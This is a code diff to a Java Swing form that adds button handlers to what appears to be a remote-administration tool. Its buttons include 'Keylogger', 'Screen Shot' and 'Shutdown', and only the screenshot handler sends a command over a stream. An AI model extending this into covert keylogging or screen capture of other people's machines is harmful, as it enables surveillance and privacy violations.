@@ -78,18 +78,43 @@ public class RemoteForm extends JFrame {
 		contentPane.add(btnProcessManagement);
 
 		JButton btnAppManagement = new JButton("App Management");
+		btnAppManagement.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				
+			}
+		});
 		btnAppManagement.setBounds(33, 91, 135, 23);
 		contentPane.add(btnAppManagement);
 
 		JButton btnScreenShot = new JButton("Screen Shot");
+		btnScreenShot.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				try {
+					dataOutputStream.writeInt(Commands.REQUEST_SCREEN_SHOT.getAbbrev());
+					
+				} catch(Exception err) {
+					err.printStackTrace();
+				}
+			}
+		});
 		btnScreenShot.setBounds(33, 124, 135, 23);
 		contentPane.add(btnScreenShot);
 
 		JButton btnKeylogger = new JButton("Keylogger");
+		btnKeylogger.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				
+			}
+		});
 		btnKeylogger.setBounds(33, 158, 135, 23);
 		contentPane.add(btnKeylogger);
 
 		JButton btnShutdown = new JButton("Shutdown");
+		btnShutdown.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				
+			}
+		});
 		btnShutdown.setBounds(33, 192, 135, 23);
 		contentPane.add(btnShutdown);
 	}
